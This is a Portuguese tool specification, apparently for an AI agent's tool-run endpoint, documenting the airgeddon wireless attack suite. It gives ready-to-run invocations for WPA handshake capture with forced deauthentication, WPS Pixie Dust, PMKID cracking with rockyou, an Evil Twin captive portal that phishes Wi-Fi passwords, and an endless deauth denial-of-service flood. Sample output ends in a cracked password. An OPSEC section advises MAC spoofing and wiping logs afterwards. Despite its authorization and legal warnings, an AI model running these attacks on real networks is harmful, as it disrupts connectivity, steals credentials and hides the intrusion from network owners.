---
name: "airgeddon"
description: "Suite completa de auditoria wireless para Linux. Ferramenta menu-driven que automatiza ataques WPA/WPA2, WPS (Pixie Dust e PIN brute force), PMKID, Evil Twin, DoS/deauth e captive portal. Requer interface wireless em modo monitor e deve ser usada apenas em redes autorizadas."
---
# airgeddon

## Objetivo

O airgeddon é uma suite de auditoria wireless all-in-one que consolida diversas ferramentas (aircrack-ng, reaver, bully, pixiewps, hashcat, etc.) em uma interface de menu interativo. Seu objetivo é facilitar testes de segurança em redes 802.11 sem exigir que o operador memorize centenas de flags individuais de cada ferramenta subjacente.

Capacidades principais:
- Captura de handshakes WPA/WPA2 com deautenticação forçada
- Ataque PMKID (sem necessidade de cliente conectado)
- Ataques WPS: Pixie Dust e PIN brute force
- Evil Twin com captive portal para phishing de credenciais
- DoS/flood de deautenticação contra clientes ou APs
- Crack offline de hashes capturados (dicionário, regras, brute force)

## Endpoint

```
/api/tools/run
```

## Requer target

Sim. É necessário especificar o BSSID do ponto de acesso alvo. Para ataques Evil Twin e captive portal, o ESSID também é obrigatório.

## Pré-requisitos

- Interface wireless com suporte a modo monitor (chipsets Atheros, Ralink, Realtek RTL8812AU recomendados)
- aircrack-ng suite instalada e no PATH
- reaver e/ou bully para ataques WPS
- pixiewps para Pixie Dust offline
- hashcat ou john para crack acelerado por GPU
- hostapd para Evil Twin
- dnsmasq para DHCP/DNS no captive portal
- Permissões root

## Parâmetros

| Parâmetro | Tipo   | Obrigatório | Descrição                                                      |
|-----------|--------|-------------|----------------------------------------------------------------|
| tool      | string | Sim         | Nome da ferramenta: `"airgeddon"`                              |
| options   | string | Sim         | String de opções e flags passadas ao airgeddon                 |

## Flags Importantes

| Flag / Opção            | Descrição                                                                 |
|-------------------------|---------------------------------------------------------------------------|
| `--iface wlan0`         | Define a interface wireless a ser usada                                   |
| `--bssid AA:BB:CC:DD`   | BSSID do ponto de acesso alvo                                             |
| `--essid "NomeRede"`    | ESSID (nome) da rede alvo                                                 |
| `--channel N`           | Canal do AP alvo (1-14 para 2.4GHz, 36-165 para 5GHz)                   |
| `--handshake-path /tmp` | Diretório para salvar capturas de handshake                               |
| `--dict /path/wordlist` | Wordlist para crack de dicionário                                         |
| `--pixie`               | Ativa modo Pixie Dust no ataque WPS                                       |
| `--evil-twin`           | Inicia modo Evil Twin (AP falso)                                          |
| `--captive-portal`      | Ativa captive portal junto ao Evil Twin                                   |
| `--deauth N`            | Número de pacotes de deautenticação a enviar                              |
| `--pmkid`               | Usa ataque PMKID (não requer handshake completo)                          |
| `--no-menu`             | Modo não interativo (útil para automação via script)                      |

## Exemplos

### Exemplo 1 - Captura de handshake WPA2

```json
{
  "tool": "airgeddon",
  "options": "--iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 --deauth 10 --handshake-path /tmp/capturas"
}
```

**Descrição:** Coloca a interface em modo monitor no canal 6, envia 10 pacotes de deauth para forçar reconexão de clientes e captura o handshake WPA2 do AP alvo.

### Exemplo 2 - Ataque WPS Pixie Dust

```json
{
  "tool": "airgeddon",
  "options": "--iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 11 --wps --pixie"
}
```

**Descrição:** Executa ataque Pixie Dust contra WPS. Eficaz contra roteadores com implementação vulnerável de WPS (Ralink, Broadcom, Realtek antigos). Completa em segundos quando vulnerável.

### Exemplo 3 - Ataque PMKID

```json
{
  "tool": "airgeddon",
  "options": "--iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --pmkid --dict /usr/share/wordlists/rockyou.txt"
}
```

**Descrição:** Captura o PMKID diretamente do AP sem necessidade de cliente conectado. Mais rápido que handshake tradicional. Faz crack offline com a wordlist fornecida.

### Exemplo 4 - Evil Twin com captive portal

```json
{
  "tool": "airgeddon",
  "options": "--iface wlan0 --bssid AA:BB:CC:DD:EE:FF --essid \"RedeAlvo\" --channel 6 --evil-twin --captive-portal --deauth 5"
}
```

**Descrição:** Cria um AP falso com o mesmo ESSID da rede alvo, deautentica clientes do AP legítimo e exibe captive portal para coletar a senha WPA quando o usuário a digita para "reconectar".

### Exemplo 5 - DoS deauth flood contra AP

```json
{
  "tool": "airgeddon",
  "options": "--iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 1 --deauth 0"
}
```

**Descrição:** Envia pacotes de deauth continuamente (0 = infinito) contra o AP alvo, desconectando todos os clientes. Usar somente em ambientes de teste autorizados.

## OPSEC

- O airgeddon gera tráfego 802.11 facilmente detectavel por sistemas WIDS (Wireless Intrusion Detection)
- Pacotes de deauth são transmitidos em broadcast e podem ser capturados por qualquer monitor nas proximidades
- O Evil Twin cria um AP com sinal geralmente mais forte — sistemas de detecao podem alertar sobre APs duplicados
- Ao usar modo monitor, o MAC da interface fica visível nos frames capturados — considere MAC spoofing antes de iniciar
- Logs do hostapd e dnsmasq ficam em /tmp por padrao — limpe apos o teste
- O ataque PMKID deixa rastros nas estatísticas de associação do AP
- AVISO LEGAL: O uso do airgeddon em redes sem autorização expressa e por escrito do proprietário é crime previsto na Lei 12.737/2012 (Lei Carolina Dieckmann) e pode resultar em prisão de 3 meses a 1 ano

## Saída

```
[airgeddon] Interface wlan0 configurada em modo monitor -> wlan0mon
[airgeddon] Scanning canais 1-14 por 20 segundos...
[airgeddon] AP encontrado: BSSID=AA:BB:CC:DD:EE:FF ESSID=RedeAlvo CH=6 ENC=WPA2 PWR=-45dBm
[airgeddon] Enviando 10 pacotes deauth para AA:BB:CC:DD:EE:FF...
[airgeddon] Handshake WPA2 capturado! Arquivo: /tmp/capturas/handshake_AABBCCDDEEFF_RedeAlvo.cap
[airgeddon] Iniciando crack com dicionário /usr/share/wordlists/rockyou.txt...
[airgeddon] SENHA ENCONTRADA: minhasenha123
```
